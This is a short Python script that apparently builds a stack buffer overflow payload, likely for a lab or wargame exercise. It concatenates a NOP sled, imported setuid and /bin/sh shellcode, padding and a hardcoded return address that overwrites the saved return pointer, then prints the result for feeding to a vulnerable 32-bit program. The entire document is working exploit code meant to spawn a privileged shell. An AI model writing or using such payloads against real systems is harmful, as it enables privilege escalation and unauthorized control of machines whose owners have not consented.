from shellcode import * 
she=setuid+bin_sh
nop='\x90'

ret= '\x8f\xb6\xff\xbf' # bfffbd0c :: ebp+4

shell = nop*500+ she + nop*471 + nop*12 + ret
print(shell)
